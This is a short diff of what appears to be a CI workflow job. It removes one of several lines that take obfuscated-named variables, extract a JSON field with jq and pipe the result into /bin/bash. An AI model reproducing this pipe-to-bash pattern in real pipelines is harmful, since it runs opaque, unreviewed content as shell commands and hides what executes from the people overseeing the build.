@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$gri5" | jq -r .imfxh59 | /bin/bash
           echo $pliss31 | jq -r .vgs5 | /bin/bash
           echo $el6 | jq -r .pb324 | /bin/bash
-          printf '%s' "$w80729" | jq -r .bo23 | /bin/bash
           echo $kq0 | jq -r .iofa984 | /bin/bash
 
       - name: Store results
